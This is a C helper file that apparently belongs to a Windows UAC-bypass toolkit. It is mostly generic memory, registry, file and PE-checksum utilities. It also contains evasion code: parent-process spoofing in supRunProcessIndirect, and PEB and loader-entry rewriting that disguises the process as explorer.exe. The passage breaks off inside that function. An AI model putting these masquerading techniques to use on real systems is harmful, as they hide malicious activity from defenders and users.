/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2019
*
*  TITLE:       SUP.C
*
*  VERSION:     3.19
*
*  DATE:        22 May 2019
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* supEncodePointer
*
* Purpose:
*
* Encodes the specified pointer.
*
*/
PVOID supEncodePointer(
    _In_ PVOID Pointer)
{
    NTSTATUS Status;
    ULONG Cookie, retLength;

    if ((g_ctx == NULL) || (g_ctx->Cookie == 0)) {

        Status = NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessCookie,
            &Cookie,
            sizeof(ULONG),
            &retLength);

        if (!NT_SUCCESS(Status))
            RtlRaiseStatus(Status);

        if (g_ctx)
            g_ctx->Cookie = Cookie;

    }
    else {
        Cookie = g_ctx->Cookie;
    }

#ifdef _WIN64
    return (PVOID)(RotateRight64(
        (ULONG_PTR)Pointer ^ Cookie,
        Cookie & 0x3f));
#else
    return (PVOID)(RotateRight32(
        (ULONG_PTR)Pointer ^ Cookie,
        Cookie & 0x1f));
#endif
}

/*
* supDecodePointer
*
* Purpose:
*
* Decodes the specified pointer.
*
*/
PVOID supDecodePointer(
    _In_ PVOID Pointer)
{
    NTSTATUS Status;
    ULONG Cookie, retLength;

    if ((g_ctx == NULL) || (g_ctx->Cookie == 0)) {

        Status = NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessCookie,
            &Cookie,
            sizeof(ULONG),
            &retLength);

        if (!NT_SUCCESS(Status))
            RtlRaiseStatus(Status);

        if (g_ctx)
            g_ctx->Cookie = Cookie;

    }
    else {
        Cookie = g_ctx->Cookie;
    }

#ifdef _WIN64
    return (PVOID)(RotateRight64(
        (ULONG_PTR)Pointer,
        0x40 - (Cookie & 0x3f)) ^ Cookie);
#else
    return (PVOID)(RotateRight32(
        (ULONG_PTR)Pointer,
        0x20 - (Cookie & 0x1f)) ^ Cookie);
#endif
}

/*
* supVirtualAlloc
*
* Purpose:
*
* Wrapper for NtAllocateVirtualMemory.
*
*/
PVOID supVirtualAlloc(
    _Inout_ PSIZE_T Size,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect,
    _Out_opt_ NTSTATUS *Status)
{
    NTSTATUS status;
    PVOID Buffer = NULL;
    SIZE_T size;

    size = *Size;

    status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &Buffer,
        0,
        &size,
        AllocationType,
        Protect);

    if (NT_SUCCESS(status)) {
        RtlSecureZeroMemory(Buffer, size);
    }

    *Size = size;
    if (Status) *Status = status;

    return Buffer;
}

/*
* supVirtualFree
*
* Purpose:
*
* Wrapper for NtFreeVirtualMemory.
*
*/
BOOL supVirtualFree(
    _In_ PVOID Memory,
    _Out_opt_ NTSTATUS *Status)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T size = 0;

    status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &Memory,
        &size,
        MEM_RELEASE);

    if (Status) *Status = status;

    return NT_SUCCESS(status);
}

/*
* supSecureVirtualFree
*
* Purpose:
*
* Wrapper for NtFreeVirtualMemory.
*
*/
BOOL supSecureVirtualFree(
    _In_ PVOID Memory,
    _In_ SIZE_T MemorySize,
    _Out_opt_ NTSTATUS *Status)
{
    RtlSecureZeroMemory(Memory, MemorySize);
    return supVirtualFree(Memory, Status);
}

/*
* supHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap with ucmHeap.
*
*/
PVOID FORCEINLINE supHeapAlloc(
    _In_ SIZE_T Size)
{
    return RtlAllocateHeap(g_ctx->ucmHeap, HEAP_ZERO_MEMORY, Size);
}

/*
* supHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap with ucmHeap.
*
*/
BOOL FORCEINLINE supHeapFree(
    _In_ PVOID Memory)
{
    return RtlFreeHeap(g_ctx->ucmHeap, 0, Memory);
}

/*
* supQueryProcessTokenIL
*
* Purpose:
*
* Return integrity level for given process.
*
*/
_Success_(return == TRUE)
BOOL supQueryProcessTokenIL(
    _In_ HANDLE hProcess,
    _Out_ PULONG IntegrityLevel)
{
    BOOL                            bCond = FALSE, bResult = FALSE;
    HANDLE                          hToken = NULL;
    PTOKEN_MANDATORY_LABEL          pTIL = NULL;
    ULONG                           Length = 0;

    do {

        if (!NT_SUCCESS(NtOpenProcessToken(
            hProcess,
            TOKEN_QUERY,
            &hToken)))
        {
            break;
        }

        if (STATUS_BUFFER_TOO_SMALL != NtQueryInformationToken(
            hToken,
            TokenIntegrityLevel,
            NULL,
            0,
            &Length))
        {
            break;
        }

        pTIL = (PTOKEN_MANDATORY_LABEL)_alloca(Length); //-V505

        if (!NT_SUCCESS(NtQueryInformationToken(
            hToken,
            TokenIntegrityLevel,
            pTIL,
            Length,
            &Length)))
        {
            break;
        }

        if (IntegrityLevel)
            *IntegrityLevel = *RtlSubAuthoritySid(
                pTIL->Label.Sid,
                (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));

        bResult = TRUE;

    } while (bCond);

    if (hToken) NtClose(hToken);

    return bResult;
}

/*
* supGetProcessWithILAsCaller
*
* Purpose:
*
* Returns handle for the process with same integrity level as caller.
*
*/
HANDLE supGetProcessWithILAsCaller(
    _In_ ACCESS_MASK UseDesiredAccess
)
{
    BOOL                            bCond = FALSE;
    HANDLE                          hProcess = NULL;
    HANDLE                          CurrentProcessId = NtCurrentTeb()->ClientId.UniqueProcess;
    PSYSTEM_PROCESSES_INFORMATION   ProcessList = NULL, pList;
    CLIENT_ID                       cid;
    OBJECT_ATTRIBUTES               obja;
    ULONG                           Level = 0, ForeignLevel = 0;

    do {

        if (!supQueryProcessTokenIL(NtCurrentProcess(), &Level))
            break;

        ProcessList = (PSYSTEM_PROCESSES_INFORMATION)supGetSystemInfo(SystemProcessInformation);
        if (ProcessList) {
            pList = ProcessList;
            for (;;) {

                if (pList->UniqueProcessId != CurrentProcessId) {

                    cid.UniqueProcess = pList->UniqueProcessId;
                    cid.UniqueThread = NULL;
                    InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);

                    if (NT_SUCCESS(NtOpenProcess(
                        &hProcess,
                        PROCESS_QUERY_LIMITED_INFORMATION | UseDesiredAccess,
                        &obja,
                        &cid)))
                    {
                        if (supQueryProcessTokenIL(hProcess, &ForeignLevel)) {
                            if (ForeignLevel == Level)
                                break;
                        }
                        NtClose(hProcess);
                    }
                }

                if (pList->NextEntryDelta == 0)
                    break;

                pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
            }

        } //if

    } while (bCond);

    if (ProcessList) supHeapFree(ProcessList);

    return hProcess;
}

/*
* supIsProcess32bit
*
* Purpose:
*
* Return TRUE if given process is under WOW64, FALSE otherwise.
*
*/
BOOLEAN supIsProcess32bit(
    _In_ HANDLE hProcess
)
{
    NTSTATUS status;
    PROCESS_EXTENDED_BASIC_INFORMATION pebi;

    if (hProcess == NULL) {
        return FALSE;
    }

    //query if this is wow64 process
    RtlSecureZeroMemory(&pebi, sizeof(pebi));
    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pebi, sizeof(pebi), NULL);
    if (NT_SUCCESS(status)) {
        return (pebi.IsWow64Process == 1);
    }
    return FALSE;
}

/*
* supGetElevationType
*
* Purpose:
*
* Returns client elevation type.
*
*/
BOOL supGetElevationType(
    _Out_ TOKEN_ELEVATION_TYPE *lpType
)
{
    HANDLE hToken = NULL;
    NTSTATUS status;
    ULONG bytesRead = 0;
    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;

    status = NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    if (NT_SUCCESS(status)) {

        status = NtQueryInformationToken(hToken, TokenElevationType, &TokenType,
            sizeof(TOKEN_ELEVATION_TYPE), &bytesRead);

        NtClose(hToken);
    }

    supSetLastErrorFromNtStatus(status);

    if (lpType)
        *lpType = TokenType;

    return (NT_SUCCESS(status));
}

/*
* supWriteBufferToFile
*
* Purpose:
*
* Create new file and write buffer to it.
*
*/
BOOL supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize
)
{
    HANDLE hFile;
    DWORD bytesIO = 0;

    if ((Buffer == NULL) || (BufferSize == 0))
        return FALSE;

    hFile = CreateFile(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
        CloseHandle(hFile);
    }
    else {
#ifdef _DEBUG
        supDebugPrint(TEXT("CreateFile"), GetLastError());
#endif
        return FALSE;
    }

    return (bytesIO == BufferSize);
}

/*
* supDebugPrint
*
* Purpose:
*
* Write formatted debug output.
*
*/
VOID supDebugPrint(
    _In_ LPWSTR ApiName,
    _In_ DWORD status
)
{
    HANDLE Heap;
    LPWSTR lpBuffer;
    SIZE_T sz;

    sz = MAX_PATH;
    if (ApiName)
        sz += _strlen(ApiName);

    if (g_ctx == NULL) {
        Heap = NtCurrentPeb()->ProcessHeap;
    }
    else {
        Heap = g_ctx->ucmHeap;
    }

    lpBuffer = (LPWSTR)RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, sz * sizeof(WCHAR));
    if (lpBuffer) {
        _strcpy(lpBuffer, TEXT("[UCM] "));
        if (ApiName) {
            _strcat(lpBuffer, ApiName);
        }
        _strcat(lpBuffer, TEXT(" code = 0x"));
        ultohex(status, _strend(lpBuffer));
        _strcat(lpBuffer, TEXT("\n"));
        OutputDebugString(lpBuffer);
        RtlFreeHeap(Heap, 0, lpBuffer);
    }

}

/*
* supRegReadValue
*
* Purpose:
*
* Read given value to output buffer.
* Returned Buffer must be released with RtlFreeHeap after use.
*
*/
NTSTATUS supRegReadValue(
    _In_ HANDLE hKey,
    _In_ LPWSTR ValueName,
    _In_ DWORD ValueType,
    _Out_ PVOID *Buffer,
    _Out_ ULONG *BufferSize,
    _In_opt_ HANDLE hHeap
)
{
    KEY_VALUE_PARTIAL_INFORMATION *kvpi;
    UNICODE_STRING usName;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    ULONG Length = 0;
    PVOID CopyBuffer = NULL;
    HANDLE Heap;

    *Buffer = NULL;
    *BufferSize = 0;

    if (hHeap == NULL)
        Heap = NtCurrentPeb()->ProcessHeap;
    else
        Heap = hHeap;

    RtlInitUnicodeString(&usName, ValueName);
    Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, NULL, 0, &Length);
    if (Status == STATUS_BUFFER_TOO_SMALL) {

        kvpi = (KEY_VALUE_PARTIAL_INFORMATION *)RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, Length);
        if (kvpi) {

            Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, kvpi, Length, &Length);
            if (NT_SUCCESS(Status)) {

                if (kvpi->Type == ValueType) {

                    CopyBuffer = RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, kvpi->DataLength);
                    if (CopyBuffer) {
                        RtlCopyMemory(CopyBuffer, kvpi->Data, kvpi->DataLength);
                        *Buffer = CopyBuffer;
                        *BufferSize = kvpi->DataLength;
                        Status = STATUS_SUCCESS;
                    }
                    else {
                        Status = STATUS_NO_MEMORY;
                    }
                }
                else {
                    Status = STATUS_OBJECT_TYPE_MISMATCH;
                }
            }
            RtlFreeHeap(Heap, 0, kvpi);
        }
        else {
            Status = STATUS_NO_MEMORY;
        }
    }

    return Status;
}

/*
* supDeleteKeyValueAndFlushKey
*
* Purpose:
*
* Remove value of the given subkey and flush key.
*
*/
BOOL supDeleteKeyValueAndFlushKey(
    _In_ HKEY hRootKey,
    _In_ LPWSTR lpKeyName,
    _In_ LPWSTR lpValueName)
{
    HKEY hKey = NULL;
    LRESULT lResult;

    if (ERROR_SUCCESS == RegOpenKeyEx(
        hRootKey,
        lpKeyName,
        0,
        MAXIMUM_ALLOWED,
        &hKey))
    {
        lResult = RegDeleteValue(hKey, lpValueName);
        if (lResult == ERROR_SUCCESS) {
            RegFlushKey(hKey);
        }
        RegCloseKey(hKey);
        return (lResult == ERROR_SUCCESS);
    }
    return FALSE;
}

/*
* supReadFileToBuffer
*
* Purpose:
*
* Read file to buffer. Release memory when it no longer needed.
*
*/
PBYTE supReadFileToBuffer(
    _In_ LPWSTR lpFileName,
    _Inout_opt_ LPDWORD lpBufferSize
)
{
    BOOL        bCond = FALSE;
    NTSTATUS    status;
    HANDLE      hFile = NULL, hRoot = NULL;
    PBYTE       Buffer = NULL;
    SIZE_T      sz = 0;

    UNICODE_STRING              usName;
    OBJECT_ATTRIBUTES           attr;
    IO_STATUS_BLOCK             iost;
    FILE_STANDARD_INFORMATION   fi;

    do {

        if (lpFileName == NULL)
            return NULL;

        if (!RtlDosPathNameToNtPathName_U(
            NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath.Buffer, &usName, NULL, NULL))
        {
            break;
        }

        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, 0, NULL);

        status = NtCreateFile(
            &hRoot,
            FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        RtlFreeUnicodeString(&usName);

        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlInitUnicodeString(&usName, lpFileName);
        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, hRoot, NULL);

        status = NtCreateFile(
            &hFile,
            FILE_READ_DATA | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlSecureZeroMemory(&fi, sizeof(fi));

        status = NtQueryInformationFile(
            hFile,
            &iost,
            &fi,
            sizeof(FILE_STANDARD_INFORMATION),
            FileStandardInformation);

        if (!NT_SUCCESS(status))
            break;

        sz = (SIZE_T)fi.EndOfFile.LowPart;

        Buffer = (PBYTE)supVirtualAlloc(
            &sz,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE,
            &status);

        if (NT_SUCCESS(status)) {

            status = NtReadFile(
                hFile,
                NULL,
                NULL,
                NULL,
                &iost,
                Buffer,
                fi.EndOfFile.LowPart,
                NULL,
                NULL);

            if (NT_SUCCESS(status)) {
                if (lpBufferSize)
                    *lpBufferSize = fi.EndOfFile.LowPart;
            }
            else {
                supVirtualFree(Buffer, NULL);
                Buffer = NULL;
            }
        }

    } while (bCond);

    if (hRoot != NULL) {
        NtClose(hRoot);
    }

    if (hFile != NULL) {
        NtClose(hFile);
    }

    return Buffer;
}

/*
* supRunProcess2
*
* Purpose:
*
* Execute given process with given parameters and wait if specified.
*
*/
BOOL supRunProcess2(
    _In_ LPWSTR lpszProcessName,
    _In_opt_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpVerb,
    _In_ INT nShow,
    _In_ BOOL fWait
)
{
    BOOL bResult;
    SHELLEXECUTEINFO shinfo;

    if (lpszProcessName == NULL)
        return FALSE;

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shinfo.lpFile = lpszProcessName;
    shinfo.lpParameters = lpszParameters;
    shinfo.nShow = nShow;
    shinfo.lpVerb = lpVerb;
    bResult = ShellExecuteEx(&shinfo);
    if (bResult) {
        if (fWait) {
            if (WaitForSingleObject(shinfo.hProcess, 120000) == WAIT_TIMEOUT)
                TerminateProcess(shinfo.hProcess, WAIT_TIMEOUT);
        }
        CloseHandle(shinfo.hProcess);
    }
    return bResult;
}

/*
* supRunProcess
*
* Purpose:
*
* Execute given process with given parameters.
*
*/
BOOL supRunProcess(
    _In_ LPWSTR lpszProcessName,
    _In_opt_ LPWSTR lpszParameters
)
{
    return supRunProcess2(lpszProcessName, lpszParameters, NULL, SW_SHOW, TRUE);
}

/*
* supRunProcessEx
*
* Purpose:
*
* Start new process in suspended state.
*
*/
_Success_(return != NULL)
HANDLE NTAPI supRunProcessEx(
    _In_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpCurrentDirectory,
    _In_opt_ LPWSTR lpApplicationName,
    _Out_opt_ HANDLE *PrimaryThread
)
{
    BOOL bResult = FALSE;
    LPWSTR pszBuffer = NULL;
    SIZE_T ccb;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;

    if (PrimaryThread)
        *PrimaryThread = NULL;

    if (lpszParameters == NULL)
        return NULL;

    ccb = (1 + _strlen(lpszParameters)) * sizeof(WCHAR);
    pszBuffer = (LPWSTR)supHeapAlloc(ccb);
    if (pszBuffer == NULL)
        return NULL;

    _strcpy(pszBuffer, lpszParameters);

    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    GetStartupInfo(&si);

    bResult = CreateProcessAsUser(
        NULL,
        lpApplicationName,
        pszBuffer,
        NULL,
        NULL,
        FALSE,
        dwFlags | CREATE_SUSPENDED,
        NULL,
        lpCurrentDirectory,
        &si,
        &pi);

    if (bResult) {
        if (PrimaryThread) {
            *PrimaryThread = pi.hThread;
        }
        else {
            CloseHandle(pi.hThread);
        }
    }
    supHeapFree(pszBuffer);
    return pi.hProcess;
}

/*
* supRunProcessIndirect
*
* Purpose:
*
* Start new process indirectly with parent set to
* randomly selected process of the same IL.
*
*/
_Success_(return != NULL)
HANDLE NTAPI supRunProcessIndirect(
    _In_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpCurrentDirectory,
    _Inout_opt_ LPWSTR lpApplicationName,
    _In_ ULONG CreationFlags,
    _In_ WORD ShowWindowFlags,
    _Out_opt_ HANDLE *PrimaryThread
)
{
    BOOL bResult = FALSE;
    DWORD dwFlags = CreationFlags | CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;

    LPWSTR pszBuffer = NULL;
    SIZE_T size;
    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;

    HANDLE hProcess, hToken = NULL, hNewProcess = NULL;

    hProcess = supGetProcessWithILAsCaller(PROCESS_CREATE_PROCESS);
    if (hProcess == NULL)
        return NULL;

    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&si, sizeof(si));

    size = (1 + _strlen(lpszParameters)) * sizeof(WCHAR);
    pszBuffer = (LPWSTR)supHeapAlloc(size);
    if (pszBuffer) {

        _strcpy(pszBuffer, lpszParameters);
        si.StartupInfo.cb = sizeof(STARTUPINFOEX);

        size = 0x30;

        do {
            if (size > 1024)
                break;

            si.lpAttributeList = supHeapAlloc(size);
            if (si.lpAttributeList) {

                if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
                    if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(hProcess), 0, 0)) //-V616
                    {

                        if (NT_SUCCESS(NtOpenProcessToken(
                            hProcess,
                            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                            &hToken)))
                        {
                            si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                            si.StartupInfo.wShowWindow = ShowWindowFlags;

                            bResult = CreateProcessAsUser(
                                hToken,
                                lpApplicationName,
                                pszBuffer,
                                NULL,
                                NULL,
                                FALSE,
                                dwFlags | EXTENDED_STARTUPINFO_PRESENT,
                                NULL,
                                lpCurrentDirectory,
                                (LPSTARTUPINFO)&si,
                                &pi);

                            if (bResult) {
                                hNewProcess = pi.hProcess;
                                if (PrimaryThread) {
                                    *PrimaryThread = pi.hThread;
                                }
                                else {
                                    CloseHandle(pi.hThread);
                                }
                            }

                            NtClose(hToken);
                        }

                    }

                    if (si.lpAttributeList)
                        DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

                }
                supHeapFree(si.lpAttributeList);
            }

        } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);

        supHeapFree(pszBuffer);
    }

    NtClose(hProcess);

    return hNewProcess;
}

/*
* supCopyMemory
*
* Purpose:
*
* Copies bytes between buffers.
*
* dest - Destination buffer
* cbdest - Destination buffer size in bytes
* src - Source buffer
* cbsrc - Source buffer size in bytes
*
*/
void supCopyMemory(
    _Inout_ void *dest,
    _In_ size_t cbdest,
    _In_ const void *src,
    _In_ size_t cbsrc
)
{
    char *d = (char*)dest;
    char *s = (char*)src;

    if ((dest == 0) || (src == 0) || (cbdest == 0))
        return;
    if (cbdest < cbsrc)
        cbsrc = cbdest;

    while (cbsrc > 0) {
        *d++ = *s++;
        cbsrc--;
    }
}

/*
* supQueryEntryPointRVA
*
* Purpose:
*
* Return EP RVA of the given PE file.
*
*/
DWORD supQueryEntryPointRVA(
    _In_ LPWSTR lpImageFile
)
{
    PVOID                       ImageBase;
    PIMAGE_DOS_HEADER           pdosh;
    PIMAGE_FILE_HEADER          pfh1;
    PIMAGE_OPTIONAL_HEADER      poh;
    DWORD                       epRVA = 0;

    if (lpImageFile == NULL) {
        return 0;
    }

    ImageBase = LoadLibraryExW(lpImageFile, 0, DONT_RESOLVE_DLL_REFERENCES);
    if (ImageBase) {

        pdosh = (PIMAGE_DOS_HEADER)ImageBase;
        pfh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + (pdosh->e_lfanew + sizeof(DWORD)));
        poh = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)pfh1 + sizeof(IMAGE_FILE_HEADER));

        //AddressOfEntryPoint is in standard fields.
        epRVA = poh->AddressOfEntryPoint;

        FreeLibrary((HMODULE)ImageBase);
    }
    return epRVA;
}

/*
* supQueryEnvironmentVariableOffset
*
* Purpose:
*
* Return offset to the given environment variable.
*
*/
LPWSTR supQueryEnvironmentVariableOffset(
    _In_ PUNICODE_STRING Value
)
{
    UNICODE_STRING   str1;
    PWCHAR           EnvironmentBlock, ptr;

    EnvironmentBlock = (PWCHAR)RtlGetCurrentPeb()->ProcessParameters->Environment;
    ptr = EnvironmentBlock;

    do {
        if (*ptr == 0)
            return 0;

        RtlInitUnicodeString(&str1, ptr);
        if (RtlPrefixUnicodeString(Value, &str1, TRUE))
            break;

        ptr += _strlen(ptr) + 1;

    } while (1);

    return (ptr + Value->Length / sizeof(WCHAR));
}

/*
* supChkSum
*
* Purpose:
*
* Calculate partial checksum for given buffer.
*
*/
USHORT supChkSum(
    ULONG PartialSum,
    PUSHORT Source,
    ULONG Length
)
{
    while (Length--) {
        PartialSum += *Source++;
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
    }
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}

/*
* supCalculateCheckSumForMappedFile
*
* Purpose:
*
* Calculate PE file checksum.
*
*/
DWORD supCalculateCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    USHORT PartialSum;
    ULONG CheckSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders != NULL) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
    }
    else
    {
        PartialSum = 0;
    }
    CheckSum = (ULONG)PartialSum + FileLength;
    return CheckSum;
}

/*
* supVerifyMappedImageMatchesChecksum
*
* Purpose:
*
* Calculate PE file checksum and compare it with checksum in PE header.
*
*/
BOOLEAN supVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PIMAGE_NT_HEADERS NtHeaders;
    ULONG HeaderSum;
    ULONG CheckSum;

    CheckSum = supCalculateCheckSumForMappedFile(BaseAddress, FileLength);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        HeaderSum = NtHeaders->OptionalHeader.CheckSum;
    }
    else {
        HeaderSum = FileLength;
    }
    return (CheckSum == HeaderSum);
}

/*
* supSetCheckSumForMappedFile
*
* Purpose:
*
* Set checksum value to PE header.
*
*/
BOOLEAN supSetCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG CheckSum
)
{
    PIMAGE_NT_HEADERS NtHeaders;

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        NtHeaders->OptionalHeader.CheckSum = CheckSum;
        return TRUE;
    }
    return FALSE;
}

/*
* ucmShowMessage
*
* Purpose:
*
* Output message to user.
*
*/
VOID ucmShowMessage(
    _In_ BOOL OutputToDebugger,
    _In_ LPWSTR lpszMsg
)
{
    if (OutputToDebugger) {
        OutputDebugString(lpszMsg);
        OutputDebugString(TEXT("\r\n"));
    }
    else {
        MessageBoxW(GetDesktopWindow(),
            lpszMsg,
            PROGRAMTITLE_VERSION,
            MB_ICONINFORMATION);
    }
}

/*
* ucmShowQuestion
*
* Purpose:
*
* Output message with question to user.
*
*/
INT ucmShowQuestion(
    _In_ LPWSTR lpszMsg
)
{
    return MessageBoxW(GetDesktopWindow(), 
        lpszMsg, 
        PROGRAMTITLE_VERSION, 
        MB_YESNO);
}

/*
* supLdrQueryResourceData
*
* Purpose:
*
* Load resource by given id (win32 FindResource, SizeofResource, LockResource).
*
*/
PBYTE supLdrQueryResourceData(
    _In_ ULONG_PTR ResourceId,
    _In_ PVOID DllHandle,
    _In_ PULONG DataSize
)
{
    NTSTATUS                   status;
    ULONG_PTR                  IdPath[3];
    IMAGE_RESOURCE_DATA_ENTRY  *DataEntry;
    PBYTE                      Data = NULL;
    ULONG                      SizeOfData = 0;

    if (DllHandle != NULL) {

        IdPath[0] = (ULONG_PTR)RT_RCDATA; //type
        IdPath[1] = ResourceId;           //id
        IdPath[2] = 0;                    //lang

        status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);
        if (NT_SUCCESS(status)) {
            status = LdrAccessResource(DllHandle, DataEntry, (PVOID*)&Data, &SizeOfData);
            if (NT_SUCCESS(status)) {
                if (DataSize) {
                    *DataSize = SizeOfData;
                }
            }
        }
    }
    return Data;
}

/*
* supSetLastErrorFromNtStatus
*
* Purpose:
*
* Convert last error.
*
*/
VOID supSetLastErrorFromNtStatus(
    _In_ NTSTATUS LastNtStatus
)
{
    DWORD dwErrorCode;
#ifdef _WIN64
    dwErrorCode = RtlNtStatusToDosErrorNoTeb(LastNtStatus);
#else
    dwErrorCode = RtlNtStatusToDosError(LastNtStatus);
#endif
    SetLastError(dwErrorCode);
}

static PWSTR g_lpszExplorer = NULL;

typedef struct _LDR_BACKUP {
    PWSTR ImagePathName;
    PWSTR CommandLine;
    PWSTR lpFullDllName;
    PWSTR lpBaseDllName;
} LDR_BACKUP, *PLDR_BACKUP;

static LDR_BACKUP g_LdrBackup;

/*
* supxLdrEnumModulesCallback
*
* Purpose:
*
* LdrEnumerateLoadedModules callback.
*
*/
VOID NTAPI supxLdrEnumModulesCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _Inout_ BOOLEAN *StopEnumeration
)
{
    PPEB Peb = NtCurrentPeb();
    PWSTR FullDllName, BaseDllName;

    BOOL Restore = PtrToInt(Context);

    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {

        if (Restore) {
            FullDllName = g_LdrBackup.lpFullDllName;
            BaseDllName = g_LdrBackup.lpBaseDllName;
        }
        else {
            g_LdrBackup.lpBaseDllName = DataTableEntry->BaseDllName.Buffer;
            g_LdrBackup.lpFullDllName = DataTableEntry->FullDllName.Buffer;
            FullDllName = g_lpszExplorer;
            BaseDllName = EXPLORER_EXE;
        }

        RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);

        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

/*
* supMasqueradeProcess
*
* Purpose:
*
* Fake/Restore current process information.
*
*/
VOID supMasqueradeProcess(
    _In_ BOOL Restore
)
{
    NTSTATUS    Status;
    PPEB        Peb = NtCurrentPeb();
    SIZE_T      RegionSize;

    PWSTR ImageFileName, CommandLine;

    if (Restore == FALSE) {

        g_lpszExplorer = NULL;
        RegionSize = PAGE_SIZE;
        Status = NtAllocateVirtualMemory(
            NtCurrentProcess(),
            (PVOID*)&g_lpszExplorer,
            0,
            &RegionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (NT_SUCCESS(Status)) {
            _strcpy(g_lpszExplorer, g_ctx->szSystemRoot);
            _strcat(g_lpszExplorer, EXPLORER_EXE);
        }
        else {
            supSetLastErrorFromNtStatus(Status);
